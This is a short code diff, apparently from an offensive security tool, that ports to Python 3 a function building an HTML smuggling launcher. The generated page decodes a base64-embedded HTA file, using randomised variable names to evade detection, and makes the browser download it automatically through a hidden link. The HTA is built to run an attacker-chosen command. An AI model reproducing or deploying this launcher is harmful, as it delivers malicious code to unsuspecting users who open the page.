@@ -31,7 +31,7 @@ def generateBase(htaCommand, htaFileName):
         End Sub
 </script>'''
 
-    launcherBase = '''<html><head><script type="text/javascript">var {0} = atob("'''+base64.b64encode(baseHta.format(randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString()))+'''");var {1} = "'''+htaFileName+'''.hta";var {2} = new Blob([{0}], {{type: 'plain/text;charset=utf-8;'}});var {3} = null;if (navigator.msSaveBlob) {{{3} = navigator.msSaveBlob({2}, {1});}} else {{{3} = window.URL.createObjectURL({2});}}var {4} = document.createElement('a');{4}.href = {3};{4}.setAttribute('download', {1});document.body.appendChild({4});{4}.click();document.body.removeChild({4});</script></head></body></html>'''
+    launcherBase = '''<html><head><script type="text/javascript">var {0} = atob("'''+base64.b64encode(baseHta.format(randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString()).encode()).decode()+'''");var {1} = "'''+htaFileName+'''.hta";var {2} = new Blob([{0}], {{type: 'plain/text;charset=utf-8;'}});var {3} = null;if (navigator.msSaveBlob) {{{3} = navigator.msSaveBlob({2}, {1});}} else {{{3} = window.URL.createObjectURL({2});}}var {4} = document.createElement('a');{4}.href = {3};{4}.setAttribute('download', {1});document.body.appendChild({4});{4}.click();document.body.removeChild({4});</script></head></body></html>'''
     launcherFinal = launcherBase.format(randomString(), randomString(), randomString(), randomString(), randomString())
     return launcherFinal
 cdata = " "
